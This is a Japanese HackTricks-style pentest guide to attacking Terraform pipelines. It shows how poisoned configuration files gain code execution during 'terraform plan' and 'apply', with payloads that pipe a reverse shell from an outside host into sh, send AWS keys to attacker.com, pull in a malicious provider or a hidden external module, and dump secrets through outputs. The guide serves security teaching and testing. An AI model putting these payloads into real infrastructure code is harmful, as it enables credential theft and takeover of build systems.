# Terraform セキュリティ

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>

## 基本情報

HashiCorp Terraformは、**インフラストラクチャをコード化するツール**であり、バージョン管理、再利用、共有が可能な人間が読める設定ファイルで**クラウドおよびオンプレミスリソース**を定義できます。一貫したワークフローを使用して、インフラストラクチャのライフサイクル全体ですべてのインフラストラクチャをプロビジョニングおよび管理できます。Terraformは、コンピュート、ストレージ、ネットワーキングリソースなどの低レベルコンポーネントだけでなく、DNSエントリやSaaS機能などの高レベルコンポーネントも管理できます。

### Terraformの仕組み

Terraformは、クラウドプラットフォームや他のサービス上のリソースを、それらのアプリケーションプログラミングインターフェース(API)を通じて作成および管理します。プロバイダーにより、アクセス可能なAPIを持つほぼすべてのプラットフォームやサービスでTerraformを使用できます。

![](<../.gitbook/assets/image (33).png>)

HashiCorpとTerraformコミュニティは、既に**1700以上のプロバイダー**を作成しており、数千種類の異なるリソースやサービスを管理でき、この数は増え続けています。[Terraform Registry](https://registry.terraform.io/)で、Amazon Web Services (AWS)、Azure、Google Cloud Platform (GCP)、Kubernetes、Helm、GitHub、Splunk、DataDogなど、すべての公開プロバイダーを見つけることができます。

Terraformのコアワークフローは3つの段階で構成されています:

* **Write:** 複数のクラウドプロバイダーやサービスにまたがるリソースを定義します。例えば、セキュリティグループとロードバランサーを備えたVPCネットワーク内の仮想マシンにアプリケーションをデプロイする設定を作成するかもしれません。
* **Plan:** Terraformは、既存のインフラストラクチャとあなたの設定に基づいて、作成、更新、または破棄するインフラストラクチャを説明する実行計画を作成します。
* **Apply:** 承認されると、Terraformは提案された操作を正しい順序で実行し、リソースの依存関係を尊重します。例えば、VPCのプロパティを更新し、そのVPC内の仮想マシンの数を変更する場合、Terraformは仮想マシンをスケーリングする前にVPCを再作成します。

![](<../.gitbook/assets/image (81).png>)

### Terraform Enterprise

Terraform Enterpriseを使用すると、`terraform plan`や`terraform apply`などのコマンドを**Terraform Cloudのセルフホストバージョン**でリモートで実行できます。したがって、そのTerraformサーバーにアクセスするための**APIキー**を見つけた場合、それを**侵害する**ことができます。\
詳細については、以下をチェックしてください:

{% content-ref url="broken-reference" %}
[リンク切れ](broken-reference)
{% endcontent-ref %}

## Terraform ラボ

コンピュータにterraformをインストールするだけです。

こちらに[ガイド](https://learn.hashicorp.com/tutorials/terraform/install-cli)があり、こちらに[terraformをダウンロードする最良の方法](https://www.terraform.io/downloads)があります。

## TerraformにおけるRCE

Terraformは**ウェブページやネットワークサービスを公開するプラットフォームを持っていない**ため、列挙できるものはありません。したがって、terraformを侵害する唯一の方法は、**terraform設定ファイルを追加または変更できる**ようにすることです。

しかし、terraformは非常に**センシティブなコンポーネント**であり、適切に機能するためには**特権アクセス**が必要になるため、侵害すると影響が大きいです。

攻撃者がterraformが実行されているシステムを侵害する主な方法は、terraformの設定を保存している**リポジトリを侵害する**ことです。なぜなら、それらはいずれかの時点で**解釈される**からです。

実際には、PRが作成された後に自動的に**terraform plan/applyを実行する**ソリューションがあります。例えば、**Atlantis**があります:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

terraformファイルを侵害できる場合、誰かが`terraform plan`または`terraform apply`を実行したときにRCEを実行するさまざまな方法があります。

### Terraform plan

Terraform planはterraformで**最も使用されるコマンド**であり、開発者やterraformを使用するソリューションは常にそれを呼び出します。したがって、`terraform plan`を実行するterraform設定ファイルを毒することで、**最も簡単にRCEを取得する方法**です。

#### 外部プロバイダーの使用

Terraformは[`external`プロバイダー](https://registry.terraform.io/providers/hashicorp/external/latest/docs)を提供しており、Terraformと外部プログラム間のインターフェースを提供する方法です。`plan`中に任意のコードを実行するために、`external`データソースを使用できます。

terraform設定ファイルに以下のようなものを注入すると、`terraform plan`を実行するときにリバースシェルが実行されます:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### カスタムプロバイダーの使用

誰でも[カスタムプロバイダー](https://learn.hashicorp.com/tutorials/terraform/provider-setup)を書いて、[Terraform Registry](https://registry.terraform.io/)に公開することができます。プライベートレジストリからカスタムプロバイダーを引っ張ってくることもできます。

それだけです：

* 資格情報や顧客データを抜き出すような悪意のあるコードを実行するカスタムプロバイダーを書く
* それをTerraform Registryに公開する
* Terraformコードにプロバイダーを機能ブランチに追加する
* 機能ブランチのPRを開く
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
プロバイダーは `init` の間に取り込まれ、`plan` の間にいくつかのコードを実行するため、任意のコード実行が可能です。

例はこちらで見つけることができます [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### 外部参照の使用

上記のオプションは有用ですが、あまり隠密性はありません（2番目のオプションはより隠密性がありますが、1番目のオプションよりも複雑です）。以下の提案に従うことで、さらに**隠密に**この攻撃を実行することができます：

* Terraformファイルにrev shellを直接追加する代わりに、rev shellを含む**外部リソースを読み込む**ことができます：
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
以下のリバースシェルコードは [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) で見つけることができます。

* 外部リソースでは、**ref** 機能を使用して、リポジトリ内のブランチに **terraform リバースシェルコードを隠す** ことができます。例えば: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply はすべての変更を適用するために実行されますが、[**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html) を含む **悪意のある Terraform ファイルを注入する** ことで RCE を取得することもできます。\
\*\*\*\*`main.tf` ファイルに以下のようなペイロードが終わることを確認するだけです：
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
**前のテクニックからの提案に従って**、この攻撃を**外部参照を使用してより慎重に実行**します。

## シークレットダンプ

`terraform apply` を実行する際に、terraformファイルに以下のようなものを追加することで、**terraformによって使用されるシークレット値をダンプ**することができます。
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## 監査ツール

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsecはterraformコードの静的分析を使用して、潜在的な誤設定を発見します。
* [**terascan**](https://github.com/tenable/terrascan): TerrascanはInfrastructure as Codeのための静的コードアナライザーです。

## 参考文献

* [Atlantis セキュリティ](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
